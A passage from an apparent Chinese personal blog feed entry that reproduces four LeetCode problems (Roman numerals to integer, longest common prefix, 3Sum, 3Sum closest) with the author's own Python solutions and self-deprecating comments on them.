href="https://leetcode-cn.com/problems/roman-to-integer">罗马数字转整数</a></h1><p>罗马数字包含以下七种字符:<code>I</code>，<code>V</code>，<code>X</code>，<code>L</code>，<code>C</code>，<code>D</code>和<code>M</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">字符数值</span><br><span class="line">I1</span><br><span class="line">V5</span><br><span class="line">X10</span><br><span class="line">L50</span><br><span class="line">C100</span><br><span class="line">D500</span><br><span class="line">M1000</span><br></pre></td></tr></table></figure><p>例如，罗马数字2写做<code>II</code>，即为两个并列的1。12写做<code>XII</code>，即为<code>X+II</code>。 27写做<code>XXVII</code>, 即为<code>XX+V+II</code>。</p><p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如4不写做<code>IIII</code>，而是<code>IV</code>。数字1在数字5的左边，所表示的数等于大数5减小数1得到的数值4 。同样地，数字9表示为<code>IX</code>。这个特殊的规则只适用于以下六种情况：</p><ul><li><code>I</code>可以放在<code>V</code>(5) 和<code>X</code>(10) 的左边，来表示 4 和 9。</li><li><code>X</code>可以放在<code>L</code>(50) 和<code>C</code>(100) 的左边，来表示 40 和90。</li><li><code>C</code>可以放在<code>D</code>(500) 和<code>M</code>(1000) 的左边，来表示400 和900。</li></ul><p>给定一个罗马数字，将其转换成整数。输入确保在 1到 3999 的范围内。<br />示例1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:&quot;III&quot;</span><br><span class="line">输出: 3</span><br></pre></td></tr></table></figure><p>示例2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:&quot;IV&quot;</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure><p>示例3:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:&quot;IX&quot;</span><br><span class="line">输出: 9</span><br></pre></td></tr></table></figure><p>示例4:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入:&quot;LVIII&quot;</span><br><span class="line">输出: 58</span><br><span class="line">解释: L &#x3D; 50, V&#x3D; 5, III &#x3D; 3.</span><br></pre></td></tr></table></figure><p>示例5:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入:&quot;MCMXCIV&quot;</span><br><span class="line">输出: 1994</span><br><span class="line">解释: M &#x3D; 1000, CM &#x3D; 900, XC &#x3D; 90, IV &#x3D; 4.</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/roman-to-integer">https://leetcode-cn.com/problems/roman-to-integer</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">romanToInt</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; int:</span></span><br><span class="line">length = <span class="built_in">len</span>(s)</span><br><span class="line">number = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;M&quot;</span>:</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;M&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">1000</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;C&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">1</span>:</span><br><span class="line">number += <span class="number">100</span></span><br><span class="line">length -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">1</span>] == <span class="string">&quot;M&quot;</span>:</span><br><span class="line">number += <span class="number">900</span></span><br><span class="line">length -= <span class="number">2</span></span><br><span class="line">s = s[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">1</span>] == <span class="string">&quot;D&quot;</span>:</span><br><span class="line">number += <span class="number">400</span></span><br><span class="line">length -= <span class="number">2</span></span><br><span class="line">s = s[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;C&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">100</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;D&quot;</span>:</span><br><span class="line">number += <span class="number">500</span></span><br><span class="line">length -= <span class="number">1</span></span><br><span class="line">s = s[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> s[_] == <span class="string">&quot;C&quot;</span>:</span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;C&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">100</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;X&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">1</span>:</span><br><span class="line">number += <span class="number">10</span></span><br><span class="line">length -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">1</span>] == <span class="string">&quot;C&quot;</span>:</span><br><span class="line">number += <span class="number">90</span></span><br><span class="line">length -= <span class="number">2</span></span><br><span class="line">s = s[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">1</span>] == <span class="string">&quot;L&quot;</span>:</span><br><span class="line">number += <span class="number">40</span></span><br><span class="line">length -= <span class="number">2</span></span><br><span class="line">s = s[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;X&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">10</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;L&quot;</span>:</span><br><span class="line">number += <span class="number">50</span></span><br><span class="line">length -= <span class="number">1</span></span><br><span class="line">s = s[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> s[_] == <span class="string">&quot;X&quot;</span>:</span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;X&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">10</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;I&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">1</span>:</span><br><span class="line">number += <span class="number">1</span></span><br><span class="line">length -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">1</span>] == <span class="string">&quot;X&quot;</span>:</span><br><span class="line">number += <span class="number">9</span></span><br><span class="line">length -= <span class="number">2</span></span><br><span class="line">s = s[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">1</span>] == <span class="string">&quot;V&quot;</span>:</span><br><span class="line">number += <span class="number">4</span></span><br><span class="line">length -= <span class="number">2</span></span><br><span class="line">s = s[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;I&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">1</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;V&quot;</span>:</span><br><span class="line">number += <span class="number">5</span></span><br><span class="line">length -= <span class="number">1</span></span><br><span class="line">s = s[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> s[_] == <span class="string">&quot;I&quot;</span>:</span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;I&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">1</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br></pre></td></tr></table></figure><p>实在想不出啥好的算法了<br />只能摆烂了</p><hr /><h1 id="最长公共前缀"><a class="markdownIt-Anchor" href="#最长公共前缀"></a> <a href="https://leetcode-cn.com/problems/longest-common-prefix">最长公共前缀</a></h1><p>编写一个函数来查找字符串数组中的最长公共前缀。</p><p>如果不存在公共前缀，返回空字符串<code>&quot;&quot;</code>。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：strs &#x3D; [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]</span><br><span class="line">输出：&quot;fl&quot;</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：strs &#x3D; [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]</span><br><span class="line">输出：&quot;&quot;</span><br><span class="line">解释：输入不存在公共前缀。</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/longest-common-prefix">https://leetcode-cn.com/problems/longest-common-prefix</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span>(<span class="params">self, strs: List[<span class="built_in">str</span>]</span>) -&gt; str:</span></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(strs) == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span>(strs[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&quot;</span> <span class="keyword">in</span> strs:</span><br><span class="line"><span class="keyword">return</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(strs)):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> strs[_].startswith(strs[<span class="number">0</span>][:length]):</span><br><span class="line"><span class="keyword">return</span>(strs[<span class="number">0</span>][:length-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> length == <span class="built_in">len</span>(strs[<span class="number">0</span>]):</span><br><span class="line"><span class="keyword">return</span>(strs[<span class="number">0</span>])</span><br><span class="line">length += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>懒得写匹配<br />直接用startswith了</p><hr /><h1 id="三数之和"><a class="markdownIt-Anchor" href="#三数之和"></a> <a href="https://leetcode-cn.com/problems/3sum/">三数之和</a></h1><p>给你一个包含<code>n</code>个整数的数组<code>nums</code>，判断<code>nums</code>中是否存在三个元素 a，b，c ，使得a + b + c = 0 ？请你找出所有和为<code>0</code>且不重复的三元组。</p><p>注意：答案中不可以包含重复的三元组。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; [-1,0,1,2,-1,-4]</span><br><span class="line">输出：[[-1,-1,2],[-1,0,1]]</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; []</span><br><span class="line">输出：[]</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; [0]</span><br><span class="line">输出：[]</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/3sum">https://leetcode-cn.com/problems/3sum</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">threeSum</span>(<span class="params">self, nums: List[<span class="built_in">int</span>]</span>) -&gt; List[List[int]]:</span></span><br><span class="line">nums.sort()</span><br><span class="line">length = <span class="built_in">len</span>(nums)</span><br><span class="line"><span class="keyword">if</span> length &lt; <span class="number">3</span>:</span><br><span class="line"><span class="keyword">return</span>([])</span><br><span class="line">neg_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> nums:</span><br><span class="line"><span class="keyword">if</span> _ &lt; <span class="number">0</span>:</span><br><span class="line">neg_count += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> _ == <span class="number">0</span>:</span><br><span class="line">neg_count += <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> neg_count == <span class="number">0</span> <span class="keyword">or</span> nums[-<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>([])</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, neg_count):</span><br><span class="line">c = -nums[_]</span><br><span class="line">a = _ + <span class="number">1</span></span><br><span class="line">b = length - <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a &lt; b:</span><br><span class="line"><span class="keyword">if</span> nums[a] + nums[b] == c:</span><br><span class="line">temp = [-c, nums[a], nums[b]]</span><br><span class="line"><span class="keyword">if</span> temp <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">result.append(temp)</span><br><span class="line">a += <span class="number">1</span></span><br><span class="line">b -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> nums[a] + nums[b] &gt; c:</span><br><span class="line">b -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> nums[a] + nums[b] &lt; c:</span><br><span class="line">a += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span>(result)</span><br></pre></td></tr></table></figure><p>实在想不出来咋做，看了下别人的题解<br />三个数之和为0在除了三个数都为0的情况下，至少有一个负数的存在<br />遍历所有的负数，两个下标分别指向c的下一位与结尾<br />通过a+b与-c的关系来移动a、b</p><hr /><h1 id="最接近的三数之和"><a class="markdownIt-Anchor" href="#最接近的三数之和"></a> 最接近的三数之和</h1><p>给定一个包括<code>n</code>个整数的数组<code>nums</code>和一个目标值<code>target</code>。找出<code>nums</code>中的三个整数，使得它们的和与<code>target</code>最接近。返回这三个数的和。假定每组输入只存在唯一答案。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; [-1,2,1,-4], target &#x3D; 1</span><br><span class="line">输出：2</span><br><span class="line">解释：与 target 最接近的和是 2 (-1 + 2 + 1 &#x3D; 2) 。</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/3sum-closest">https://leetcode-cn.com/problems/3sum-closest</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">threeSumClosest</span>(<span class="params">self, nums: List[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; int:</span></span><br><span class="line">length = <span class="built_in">len</span>(nums)</span><br><span class="line"><span class="keyword">if</span> length &lt; <span class="number">3</span>:</span><br><span class="line"><span class="keyword">return</span>([])</span><br><span class="line">nums.sort()</span><br><span class="line"><span class="keyword">if</span> target &gt;= <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> target &lt; nums[<span class="number">0</span>]:</span><br><span class="line"><span class="keyword">return</span>(nums[<span class="number">0</span>] + nums[<span class="number">1</span>] + nums[<span class="number">2</span>])</span><br><span class="line">neg_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> nums:</span><br><span class="line"><span class="keyword">if</span> _ &lt; target:</span><br><span class="line">neg_count += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> _ == target:</span><br><span class="line">neg_count += <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">sub = <span class="number">9999</span></span><br><span class="line">result = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, neg_count):</span><br><span class="line">c = -nums[_]</span><br><span class="line">a = _ + <span class="number">1</span></span><br><span class="line">b = length - <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a &lt; b:</span><br><span class="line"><span class="keyword">if</span> sub == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> nums[a] + nums[b] == c + target:</span><br><span class="line">result = target</span><br><span class="line">sub = <span class="number">0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> nums[a] + nums[b] &gt; c + target:</span><br><span class="line">temp = <span class="built_in">abs</span>(nums[a] + nums[b] - c - target)</span><br><span class="line"><span class="keyword">if</span> temp &lt; sub:</span><br><span class="line">sub = temp</span><br><span class="line">result = nums[a] + nums[b] - c</span><br><span class="line">b -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> nums[a] + nums[b] &lt; c + target:</span><br><span class="line">temp = <span class="built_in">abs</span>(nums[a] + nums[b] - c - target)</span><br><span class="line"><span class="keyword">if</span> temp &lt; sub:</span><br><span class="line">sub = temp</span><br><span class="line">result = nums[a] + nums[b] - c</span><br><span class="line">a += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span>(result)</span><br><span class="line"><span class="keyword">elif</span> target &lt; <span class="number">0</span>:</span><br><span class="line">nums = nums[::-<span class="number">1</span>]</span><br><span class="line">print(nums)</span><br><span class="line"><span class="keyword">if</span> target &gt; nums[<span class="number">0</span>]:</span><br><span class="line"><span class="keyword">return</span>(nums[<span class="number">0</span>] + nums[<span class="number">1</span>] + nums[<span class="number">2</span>])</span><br><span class="line">neg_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> nums:</span><br><span class="line"><span class="keyword">if</span> _ &gt; target:</span><br><span class="line">neg_count += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> _ == target:</span><br><span class="line">neg_count += <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">sub = <span class="number">9999</span></span><br><span class="line">result = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, neg_count):</span><br><span class="line">c = -nums[_]</span><br><span class="line">a = _ + <span class="number">1</span></span><br><span class="line">b = length - <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a &lt; b:</span><br><span class="line"><span class="keyword">if</span> sub == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> nums[a] + nums[b] == c + target:</span><br><span class="line">result = target</span><br><span class="line">sub = <span class="number">0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> nums[a] + nums[b] &gt; c + target:</span><br><span class="line">temp = <span class="built_in">abs</span>(nums[a] + nums[b] - c - target)</span><br><span class="line"><span class="keyword">if</span> temp &lt; sub:</span><br><span class="line">sub = temp</span><br><span class="line">result = nums[a] + nums[b] - c</span><br><span class="line">a += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> nums[a] + nums[b] &lt; c + target:</span><br><span class="line">temp = <span class="built_in">abs</span>(nums[a] + nums[b] - c - target)</span><br><span class="line"><span class="keyword">if</span> temp &lt; sub:</span><br><span class="line">sub = temp</span><br><span class="line">result = nums[a] + nums[b] - c</span><br><span class="line">b -= <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span>(result)</span><br></pre></td></tr></table></figure><p>跟上一题差不多的思路，加了点变化罢了<br />分了target正负两种情况来处理<br />但是写得太拉了</p><hr /><p>算法就图一乐，收收心干安服辣</p><p>EOF</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;做课程项目的时候发现自己对算法一无所知&lt;br /&gt;
刷刷题吧&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="LeetCode" scheme="https://yoloyolo.top/tags/LeetCode/"/>
    
  </entry>
  
</feed>
